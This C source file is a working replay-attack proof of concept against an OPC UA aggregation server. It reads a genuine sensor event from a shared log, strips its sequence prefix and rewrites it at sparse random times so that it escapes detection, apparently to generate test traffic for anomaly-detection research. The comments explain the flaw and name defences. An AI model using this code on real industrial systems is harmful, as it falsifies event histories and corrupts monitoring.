// =============================================================================
// Replay（重放）攻擊 PoC ── 應用層重放
// =============================================================================
// 目標：aggregation_server@4840 的 CentralLog（讀舊 log）+ CentralLogIn（重寫）。
//
// 重放的定義：攻擊者側錄一則合法訊息，稍後原樣重送，讓系統誤以為是新的合法事件。
//
// 本系統為何可行（關鍵）：
//   - CentralLog 是 String 陣列 ring buffer，每行前綴 server 加的 "#<seq> "。
//   - Anomaly_client 用 seq 去重：只處理 seq 比上次大的行（見 Anomaly_client.c）。
//   - ⚠️ 但這個 seq 是「server 在寫入時才指派」的，不是訊息內容的一部分。
//     所以攻擊者只要把『舊 log 的文字內容（去掉舊 seq）』重新寫進 CentralLogIn，
//     server 就會幫它蓋上一個『全新的、更大的 seq』→ Anomaly 認為是新事件，收下。
//   → seq 去重防的是「漏接」，不是「重放」；重放因此成立。
//
// 本 PoC 流程：
//   1. 連上 4840，讀 CentralLog（String[]），挑一則『真實的舊事件』log。
//   2. 剝掉它的 "#<oldseq> " 前綴，取出純訊息內容。
//   3. 稍後把這段內容原樣寫回 CentralLogIn → 拿到新 seq、被當成新事件重播。
//   這會在歷史裡製造出「同一個事件發生了兩次」的假象（例如同一筆感測讀數、
//   同一個馬達動作被重複記錄），污染任何基於事件計數/頻率的分析。
//
// 觀察重點：在 Anomaly 端會看到『文字內容完全相同、但 seq 不同、時間戳較晚』的
//   重複事件——這正是重放的指紋。防禦需要 nonce / 訊息內嵌單調序號 / 時間窗，
//   而非 server 端事後補的 seq。
//
// ⚠️ 僅用於你自己機器上、你自己系統的授權安全測試。
// =============================================================================
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#include <open62541/client_config_default.h>
#include <open62541/client_highlevel.h>

// ---- 可調參數 ----
#ifndef N_REPLAY
#define N_REPLAY      3      // 整段共重放幾次
#endif
#ifndef BASELINE_SEC
#define BASELINE_SEC  300    // 潛伏總時長（秒），與其他攻擊一致
#endif

static volatile UA_Boolean running = true;
static void stopHandler(int sig) { (void)sig; running = false; }

// 從 "#<seq> <內容>" 取出 <內容>（去掉 server 加的序號前綴）。
// 找不到前綴就原樣回傳。
static const char *strip_seq_prefix(const char *line) {
    if (line[0] != '#') return line;
    const char *p = line + 1;
    while (*p >= '0' && *p <= '9') p++;
    if (*p == ' ') p++;
    return p;
}

static UA_StatusCode write_login(UA_Client *client, const char *content) {
    UA_Variant v;
    UA_String s = UA_STRING((char *)content);
    UA_Variant_setScalar(&v, &s, &UA_TYPES[UA_TYPES_STRING]);
    return UA_Client_writeValueAttribute(client, UA_NODEID_STRING(1, "CentralLogIn"), &v);
}

int main(int argc, char **argv) {
    // 可選參數 sensor_id（>=1）：重放哪一個 sensor 的距離事件。
    //   replay 是側錄真實舊事件原樣重送，身分繼承自被側錄的那一行。原本從尾端挑
    //   「最後一筆 Updated distance」→ 挑到誰全看側錄瞬間誰剛好最後寫入（見前一輪
    //   實測：三份實例只中 Sensor/Sensor2，pair3 落空）。給定 sensor_id 就鎖定側錄
    //   該 pair 的事件，讓 collect_topo3.sh 的 $k 真的能覆蓋三組 pair。
    //   sensor_id=1 → 找 SourceName=Sensor（非 Sensor2/3）；i>=2 → SourceName=Sensor<i>。
    int want_sensor = 0;              // 0 = 不指定（沿用舊行為：挑最後一筆）
    char want_src[32] = {0};
    if (argc > 1) {
        want_sensor = atoi(argv[1]);
        if (want_sensor < 1) { fprintf(stderr, "用法: %s [sensor_id>=1]\n", argv[0]); return 2; }
        if (want_sensor == 1) snprintf(want_src, sizeof(want_src), "SourceName=Sensor ");
        else                  snprintf(want_src, sizeof(want_src), "SourceName=Sensor%d ", want_sensor);
    }

    signal(SIGINT, stopHandler);
    signal(SIGTERM, stopHandler);

    UA_Client *client = UA_Client_new();
    UA_ClientConfig_setDefault(UA_Client_getConfig(client));

    printf("[REPLAY] Connecting to aggregation_server@4840 (anonymous)...\n");
    UA_StatusCode rc = UA_Client_connect(client, "opc.tcp://127.0.0.1:4840");
    if (rc != UA_STATUSCODE_GOOD) {
        printf("[REPLAY] Connect failed: %s\n", UA_StatusCode_name(rc));
        UA_Client_delete(client);
        return 1;
    }
    printf("[REPLAY] Connected.\n");

    // ---- 步驟 1&2：側錄——讀 CentralLog，挑一則真實舊事件，剝掉 seq 前綴 ----
    UA_Variant v; UA_Variant_init(&v);
    rc = UA_Client_readValueAttribute(client, UA_NODEID_STRING(1, "CentralLog"), &v);
    if (rc != UA_STATUSCODE_GOOD || !UA_Variant_hasArrayType(&v, &UA_TYPES[UA_TYPES_STRING]) ||
        v.arrayLength == 0) {
        printf("[REPLAY] CentralLog empty or unreadable (%s). 先讓系統跑一會兒再試。\n",
               UA_StatusCode_name(rc));
        UA_Variant_clear(&v);
        UA_Client_disconnect(client); UA_Client_delete(client);
        return 1;
    }

    UA_String *arr = (UA_String *)v.data;
    // 挑一筆真實 sensor 距離事件當側錄樣本：從尾端往前找含 "Updated distance" 的。
    // 若指定了 want_src，還要求該行的 SourceName 正好是目標 pair（鎖定重放對象）。
    char captured[1088] = {0};
    for (size_t i = v.arrayLength; i-- > 0; ) {
        char tmp[1088];
        size_t n = arr[i].length < sizeof(tmp) - 1 ? arr[i].length : sizeof(tmp) - 1;
        memcpy(tmp, arr[i].data, n); tmp[n] = '\0';
        if (!strstr(tmp, "Updated distance")) continue;
        if (want_src[0] && !strstr(tmp, want_src)) continue;   // 不是目標 pair → 跳過
        snprintf(captured, sizeof(captured), "%s", strip_seq_prefix(tmp));
        printf("[REPLAY] CAPTURED a genuine past event%s (seq stripped):\n         %s\n",
               want_src[0] ? " for target pair" : "", captured);
        break;
    }
    UA_Variant_clear(&v);

    if (captured[0] == '\0') {
        printf("[REPLAY] 沒找到可側錄的 sensor 事件，改用 CentralLog 最後一行。\n");
        // 退而求其次略過；實務上通常都會有 sensor 距離事件。
        UA_Client_disconnect(client); UA_Client_delete(client);
        return 1;
    }

    // ---- 步驟 3：稀疏重放——在 baseline 期間隨機時點把側錄內容原樣寫回 ----
    // 每次重放都拿到新 seq、被當新事件；但因為稀疏散佈（不再 3 秒內連發），
    // 重放行埋進大量正常流量裡，隱蔽度高。指紋仍是「內容+內嵌時間戳完全相同」。
    srand((unsigned)time(NULL) ^ 0x9e3d);
    int replay_at[N_REPLAY];
    for (int i = 0; i < N_REPLAY; i++) replay_at[i] = rand() % BASELINE_SEC;
    for (int i = 1; i < N_REPLAY; i++) {
        int key = replay_at[i], j = i - 1;
        while (j >= 0 && replay_at[j] > key) { replay_at[j + 1] = replay_at[j]; j--; }
        replay_at[j + 1] = key;
    }

    printf("[REPLAY] Lurking %d s, sparsely replaying the captured event %d times...\n",
           BASELINE_SEC, N_REPLAY);

    time_t start = time(NULL);
    int next = 0;
    while (running) {
        int elapsed = (int)(time(NULL) - start);
        if (elapsed >= BASELINE_SEC) break;

        while (next < N_REPLAY && replay_at[next] <= elapsed) {
            if (write_login(client, captured) == UA_STATUSCODE_GOOD)
                printf("[REPLAY] t=%ds REPLAYED #%d (identical text, NEW seq): %s\n",
                       elapsed, next + 1, captured);
            else
                printf("[REPLAY] t=%ds replay write #%d failed.\n", elapsed, next + 1);
            next++;
        }

        UA_Client_run_iterate(client, 0);
        usleep(200000);
    }

    printf("[REPLAY] Done (%d/%d replayed). 在 Anomaly 端會看到『內容相同、seq 不同、時間較晚』的重複事件。\n", next, N_REPLAY);
    UA_Client_disconnect(client);
    UA_Client_delete(client);
    return 0;
}
